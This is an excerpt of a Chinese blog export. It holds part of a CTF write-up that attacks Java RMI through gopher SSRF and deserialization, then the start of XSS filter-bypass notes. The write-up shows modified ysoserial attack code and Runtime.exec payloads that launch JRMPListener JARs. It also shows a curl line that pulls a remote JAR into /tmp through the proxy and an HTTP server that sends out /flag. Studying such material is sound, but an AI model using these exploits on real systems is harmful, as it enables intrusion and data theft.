        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>pq<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> pq<span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> null<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>用常见的PriorityQueue整了一个链，前半段和CC2的触发环节差不多，在siftDownUsingComparator函数中，进行了<code>comparator.compare(x, (E) c)</code>这么一个操作，调用了comparator的compare方法。在CC2中是令comparator为TransformingComparator，然后这个类的compare方法中调用了其transformer属性的transform方法，步入正轨，而这里我们直接把他的comparator赋值成我们的代理类，这样子在这里对字符串进行比较的时候，直接拿着这个字符串进行exec</p>
<h4 id="攻击RMIserver"><a href="#攻击RMIserver" class="headerlink" title="攻击RMIserver"></a>攻击RMIserver</h4><p>接下来就是怎么样打远端了，经过长时间的踩坑，看工具的源码等操作，我得出了如下几点结论<br>RMI调用分为两个阶段，lookup和call，需要先lookup从registry那里拿一个stub回来，再分析这个stub得到server相关信息，进而向server发起调用。<br>其中，lookup和call是分开的，这其间的通信就如同HTTP一样，是我发一个包你回一个包，因此可以通过gopher协议来先进行查询，再进行调用</p>
<p>lookup的请求是可以重放的，且只要方法绑定在registry上的name和方法的signature和本地的一致，就能通过重放本地流量的方式完成lookup的请求。<br>至于怎么算方法的signature，随便搜搜就有了<br><a href="https://stackoverflow.com/questions/8066253/compute-a-java-functions-signature/8066268">Compute a Java function’s signature</a><br>但是就算是完全一样的代码，在不同的机器上可能会因为生成的objid等原因导致lookup的结果并不一样，所以对应不同的环境还是要重新stub。</p>
<p>先手打一下本地，把lookup的请求流量存下来，放vps上整个页面用gopher进行内网ssrf。<br>然后再curl一下把得到的lookup返回的stub存到本地，魔改一下代码，把工具中attack函数中的第一个exploit函数改成直接读存到本地的stub文件，然后把得到的server提供服务的端口拿到</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span>String filename<span class="token punctuation">,</span> <span class="token keyword">int</span> registryPort<span class="token punctuation">,</span> String lookupName<span class="token punctuation">,</span> String methodSignature<span class="token punctuation">,</span> Object payloadObject<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>
        ObjID objID_ <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjID</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">//Lookup</span>
        <span class="token comment" spellcheck="true">// byte[] returnData = Stub.exploit(registryHost, registryPort, lookupName, objID_, 2, 4905912898345647071L);</span>

        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> returnData <span class="token operator">=</span> <span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token string">"lookup.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">// System.out.print(Arrays.toString(returnData));</span>
        <span class="token keyword">int</span> index <span class="token operator">=</span> KMPMatch<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>returnData<span class="token punctuation">,</span> <span class="token string">"UnicastRef"</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> serializationData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token operator">+</span>returnData<span class="token punctuation">.</span>length<span class="token operator">-</span>index<span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        serializationData<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token number">0xac</span><span class="token punctuation">;</span>
        serializationData<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token number">0xed</span><span class="token punctuation">;</span>
        serializationData<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token number">0x00</span><span class="token punctuation">;</span>
        serializationData<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token number">0x05</span><span class="token punctuation">;</span>
        serializationData<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token number">0x77</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// TC_BLOCKDATA</span>
        serializationData<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token punctuation">(</span>returnData<span class="token punctuation">.</span>length<span class="token operator">-</span>index<span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Length</span>
        System<span class="token punctuation">.</span><span class="token function">arraycopy</span><span class="token punctuation">(</span>returnData<span class="token punctuation">,</span> index<span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">,</span> serializationData<span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> returnData<span class="token punctuation">.</span>length<span class="token operator">-</span>index<span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ByteArrayInputStream byteArrayInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>serializationData<span class="token punctuation">)</span><span class="token punctuation">;</span>
        ObjectInputStream objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>byteArrayInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        String tcp_host <span class="token operator">=</span> objectInputStream<span class="token punctuation">.</span><span class="token function">readUTF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> tcp_port <span class="token operator">=</span> objectInputStream<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>tcp_port<span class="token punctuation">)</span><span class="token punctuation">;</span>
        ObjID objID <span class="token operator">=</span> ObjID<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>objectInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">long</span> hash <span class="token operator">=</span> ComputeMethodHash<span class="token punctuation">.</span><span class="token function">computeMethodHash</span><span class="token punctuation">(</span>methodSignature<span class="token punctuation">)</span><span class="token punctuation">;</span>
        Stub<span class="token punctuation">.</span><span class="token function">exploit</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> tcp_port<span class="token punctuation">,</span> payloadObject<span class="token punctuation">,</span> objID<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> hash<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>exploit也魔改一下，把对远程输出的内容写到本地，拖到vps上，再整个页面进行gopher转发</p>
<h5 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h5><p>一切看起来都非常的美好且顺利，但实际上我踩了无数个坑，虽然都是因为我太菜了。。。</p>
<ol>
<li>完全相同的代码在不同的环境下lookup的stub不一致。虽然由stub生成的payload和目标主机的ip端口并无关系，但不同主机直接的stub并不一致。一开始我以为这个也是一致的就直接拿着本地返回的stub在打，浪费了好多时间。</li>
<li>registry端口和service端口并不一致！！！虽然这是个显而易见而愚蠢的问题，但由于工具里是自动从stub里拿到服务的ip port，导致我并没有意识到这一点，打了一个下午都一直报<code>noSuchObject</code>的错误，找了好久，在这里再次感谢rmb神仙的指导呜呜呜呜，麻烦师傅了</li>
<li>不能直接把二进制文件读出来然后拼在gopher后面重定向，可以url编码一次，curl居然也能正常解析，但PHP的urlencode会把空格变成+，这似乎会影响curl重定向的解析，手动替换一下改成%20。</li>
<li>最好是能怎么样把原始数据存下来，之前因为一直打不通以为lookup的生命周期很短，所以我抄了一个java的http请求函数，但是这个函数用了utf8对结果解码，虽然好像在这里没有影响，但是rmb神仙还是建议我不要这么做并发出多个 气晕.jpg。呜呜呜，最好还是直接用curl访问直接写文件</li>
</ol>
<h4 id="写入jar包"><a href="#写入jar包" class="headerlink" title="写入jar包"></a>写入jar包</h4><p>命令执行了并没有什么用，server和client不能出网，并且反序列化一般没有回显，再之在server上执行命令并不能拿到client上的flag。而对client能做的就是用spider去触发他调用server的sayHello方法，所以思路应该是往server上写一个JRMPListener的jar包。当然，调用的方法已经在server上注册了，那个端口虽然能通过lookup拿到，但实际上是已经被占用了的，所以可以用rebind方法，把这个唯一的服务重新换一个端口，且端口可以在exportObject函数中固定，填0就是随机分配端口。但同样的，exportObject也会将这个端口占用，因此需要在registry上注册了这个端口之后把服务停了，然后在这个端口上起一个JRMPListener，代码如下（当然是抄rmb的，再磕一个头）<br>这里约定一个12345端口，然后在把yso里面JRMPListener给拉出来，把端口直接写死成约定端口，魔改一下</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Rebinder</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            UserInter userImpl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UserImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            UserInter user <span class="token operator">=</span> <span class="token punctuation">(</span>UserInter<span class="token punctuation">)</span> UnicastRemoteObject<span class="token punctuation">.</span><span class="token function">exportObject</span><span class="token punctuation">(</span>userImpl<span class="token punctuation">,</span> <span class="token number">12345</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            Registry registry <span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            registry<span class="token punctuation">.</span><span class="token function">rebind</span><span class="token punctuation">(</span><span class="token string">"0ops"</span><span class="token punctuation">,</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>
            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"rebind success!exit!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            System<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var4<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            var4<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这里也踩了一天的坑，yso的JRMPListener中有几个外部依赖，其中有一个叫javassist，是用来魔改字节码之类的造一个类的。如果不去掉这个依赖，那么我们的简单Rebinder+JRMPListener缝合怪会直接700k+，但仔细跟入会发现，这个第三方库只在JRMPListener的一个构造函数中使用，而当前我们的情况并不需要这个构造函数，而是使用的另一个构造函数，仔细翻一下发现所有的第三方依赖均在当前的简单情况下为非必要的，都可以去掉。这样子就能把我们的缝合怪压缩到20k-<br>之所以要压缩缝合怪，是因为我们需要用之前的命令执行在server上echo来一个jar包，因此我们的这个jar包就会完全包含在我们的payload中，而payload是header重定向塞在gopher里的，payload过长会出现不可预知的错误，简单来说就是跑不通。<br>并且想echo二进制数据到文件，为了防止二进制数据中奇怪的字符串破坏命令，最好还要将二进制文件先base64encode一下，到时候在decode输出，防止出现奇怪字符导致的问题，但这样又会将整个文件的大小增加大概33%，更加跑不通了<br>尝试对扩张后的1000k文件进行分片压缩，分到100k每份，也跑不通</p>
<p>因此，听从rmb神仙的建议，翻了翻JRMPListener的依赖，把不必要的代码和依赖删掉，把缝合怪jar压缩到17k-，然后base64保障安全20k+，20k+能够直接一把梭写到server上，然后再改一下payload把jar跑起来</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"start"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            Runtime r <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            Process p <span class="token operator">=</span> r<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"bash"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"java -cp /tmp/servergadget.jar com.yxxx.Rebinder"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            p<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            p <span class="token operator">=</span> r<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"bash"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"java -cp /tmp/servergadget.jar com.yxxx.yso.JRMPListener"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            p<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

    <span class="token punctuation">}</span>
</code></pre>
<p>JRMPListener里面的利用类就直接把题目给的gadget塞进去就行了，简单的利用简单的快乐。</p>
<h3 id="攻击RMIclient"><a href="#攻击RMIclient" class="headerlink" title="攻击RMIclient"></a>攻击RMIclient</h3><p>但面临着和攻击server的同样困境，client不通外网，且命令执行没有回显。也就是说之前对server的攻击其实全是盲打，完全不知道打没打通，所以本地复现的时候拿题目环境在本地搭了docker，边打边进docker看写进去了没。。。<br>攻击client同样也得想办法怎么外带出来，唯一的外带点就是我们可爱的spider。所以比较实用的方法是起一个HTTPserver，或者直接nc一个端口，连上来就给flag，python也能启动简单的httpserver，但是在docker里试了一下，诶，nc，python都没有。只能启动httpserver了。</p>
<p>那么现在的问题就在于，怎么再塞一个jar包到client上，同样的，我们也可以再echo到server上的JRMPListener里面的payload再塞一个echo，打好包的httpserver jar再echo出来，这样子的话就不能用可爱的spring boot了，这个玩意必定打包依赖，一打出来能用10M+，绝对的暴毙<br>百度了一下java原生类的httpserver，能打一个20k以内的jar包，功能就直接读flag拿出来了，其实代码还能再删减一点，整体base64超级打包应该能在50k内解决，但不知道50k能不能搞定，实在不行就分两半写入</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>net<span class="token punctuation">.</span>httpserver<span class="token punctuation">.</span>HttpServer<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>InetSocketAddress<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>Executors<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SimpleHttpd</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>
        HttpServer httpServer <span class="token operator">=</span> HttpServer<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InetSocketAddress</span><span class="token punctuation">(</span><span class="token number">8083</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        httpServer<span class="token punctuation">.</span><span class="token function">createContext</span><span class="token punctuation">(</span><span class="token string">"/myserver"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">MyHttpHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        httpServer<span class="token punctuation">.</span><span class="token function">setExecutor</span><span class="token punctuation">(</span>Executors<span class="token punctuation">.</span><span class="token function">newFixedThreadPool</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        httpServer<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>net<span class="token punctuation">.</span>httpserver<span class="token punctuation">.</span>HttpExchange<span class="token punctuation">;</span>
<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>net<span class="token punctuation">.</span>httpserver<span class="token punctuation">.</span>HttpHandler<span class="token punctuation">;</span>

<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>BufferedReader<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileReader<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>OutputStream<span class="token punctuation">;</span>


<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyHttpHandler</span> <span class="token keyword">implements</span> <span class="token class-name">HttpHandler</span> <span class="token punctuation">{</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handle</span><span class="token punctuation">(</span>HttpExchange httpExchange<span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            StringBuilder responseText <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            BufferedReader in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            StringBuilder flag <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            String str<span class="token punctuation">;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>str <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                flag<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            responseText<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">handleResponse</span><span class="token punctuation">(</span>httpExchange<span class="token punctuation">,</span> responseText<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            ex<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">handleResponse</span><span class="token punctuation">(</span>HttpExchange httpExchange<span class="token punctuation">,</span> String responsetext<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
        StringBuilder responseContent <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        responseContent<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&lt;html>"</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&lt;body>"</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>responsetext<span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&lt;/body>"</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&lt;/html>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        String responseContentStr <span class="token operator">=</span> responseContent<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> responseContentByte <span class="token operator">=</span> responseContentStr<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        httpExchange<span class="token punctuation">.</span><span class="token function">getResponseHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"Content-Type:"</span><span class="token punctuation">,</span> <span class="token string">"text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        httpExchange<span class="token punctuation">.</span><span class="token function">sendResponseHeaders</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> responseContentByte<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
        OutputStream out <span class="token operator">=</span> httpExchange<span class="token punctuation">.</span><span class="token function">getResponseBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        out<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>responseContentByte<span class="token punctuation">)</span><span class="token punctuation">;</span>
        out<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>rmb神仙提出了另一个极其巧妙的解决方案，可以让client调用curl通过spider在外网上下载，这样子就只需要在JRMPListener里面塞一句curl就能把vps上的jar包给下下来了<code>curl http://spider:8080/?url=https://xxxxx/1.jar &gt; /tmp/1.jar</code><br>然后再把JRMPListener的payload改一下启动简易http服务，spider访问拿到flag。<br>这么说来server那里也可以直接把命令改成curl通过spider下jar包，也就没有之前那么麻烦的去删依赖了</p>
<p>这里想到vps上直接用nc向外提供jar包，这样子的话如果连上来了还能有个回显，不至于太盲打</p>
<h3 id="end"><a href="#end" class="headerlink" title="end"></a>end</h3><p>整体理下来这个题目似乎并不是非常的复杂，首先通过curl重定向更改协议，用gopher攻击rmi服务，在rmi服务上命令执行后启动一个JRMPListener，再通过spider触发client访问JRMPListener，做到在client上命令执行，最后想办法（比如http服务器）将flag外带</p>
<p><del>事实上，最后一步没有打通，也就是让client访问JRMPListener进行命令执行，但非常奇怪的点是，我进入client容器用spider下了一个直接进行RMI调用的jar包，然后运行那个jar包是能打通的，而用spider触发client去访问却打不通，最近要忙国赛和保研了，如果一切都顺利结束再回来填坑吧</del></p>
<h3 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h3><p>没有rmb神仙的wp和连续两三天的高强度指导我肯定复现不出来这个题，期间因为我垃圾的基础知识还问了他很多愚蠢的问题，再次表示感谢呜呜呜</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>RMI</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS</title>
    <url>/XSS.html</url>
    <content><![CDATA[<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>自己测试的时候要意识到Chrome，IE这些浏览器都自带一个XSS的过滤，做题或者测试建议用火狐<br>XSS漏洞发生在用户输入的数据未经处理就放入前端JS代码的情况下，常见的XSS漏洞有反射型XSS和储存型XSS</p>
<h2 id="简单无过滤"><a href="#简单无过滤" class="headerlink" title="简单无过滤"></a>简单无过滤</h2><p>直接闭合一下括号引号就可以了，XSS漏洞可以直接查源码看引号括号标签怎么闭合，比较好修改。<br>今天的发现：</p>
<ul>
<li>&lt;input&gt;标签未闭合的时候好像不能在里面继续加标签</li>
<li>在&lt;input&gt;标签中可以通过事件(onclick,onmousemove等)来触发JS函数</li>
</ul>
<h2 id="前端干扰"><a href="#前端干扰" class="headerlink" title="前端干扰"></a>前端干扰</h2><p>设置了输入长度限制，按钮按不下去什么的，直接前端改代码就可以了</p>
<h2 id="lt-gt-被转义"><a href="#lt-gt-被转义" class="headerlink" title="&lt;&gt;被转义"></a>&lt;&gt;被转义</h2><p>这种情况直接审查元素有时候看不出来，但是你如果查看页面源码就可以看到尖括号是否被转义。<br>通常绕过方法有闭合引号直接在当前标签内添加事件来触发。<br>也可以试试有没有其他的无过滤参数，比如下拉框内容抓包修改进行注入</p>
<h2 id="“被转义"><a href="#“被转义" class="headerlink" title="“被转义"></a>“被转义</h2><p>有的时候可以试试加一个空格来分隔属性，偶尔有效</p>
<h2 id="JS伪协议"><a href="#JS伪协议" class="headerlink" title="JS伪协议"></a>JS伪协议</h2><p>href定义的超链接可以执行JS代码，如<code>&lt;a href=&quot;alert(1);&quot;&gt;</code></p>
<h2 id="utf-7编码绕过"><a href="#utf-7编码绕过" class="headerlink" title="utf-7编码绕过"></a>utf-7编码绕过</h2><p>好像现在只有IE还有这个漏洞，别的浏览器都修好了</p>
<h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><p>XSS在注入的时候也是后台代码进行分析，这个绕过和SQL注入也很像</p>
<h2 id="实体编码绕过"><a href="#实体编码绕过" class="headerlink" title="实体编码绕过"></a>实体编码绕过</h2><p>&amp;#xx;为HTML的实体编码，部分特殊符号被实体编码表示<br>但也可以用实体编码表示某些正常字符，绕过检测</p>
<h2 id="添加制表符绕过"><a href="#添加制表符绕过" class="headerlink" title="添加制表符绕过"></a>添加制表符绕过</h2><p>可用&amp;NewLine代替空格<br>使用%09，&amp;#09;(有分号)分隔字符串绕过。<br>当数据以get方式传递时，%09可使用，使用后者会导致&amp;作为元素之间的分隔符导致截断，后者可将&amp;#替换为%26%23后使用<br>当数据以post方式传递时，&amp;#09;可使用，使用前者在数据post出去后会进行url编码为%2509，传入后只能解码为%09，无法绕过，在bp中抓包添加%09也可</p>
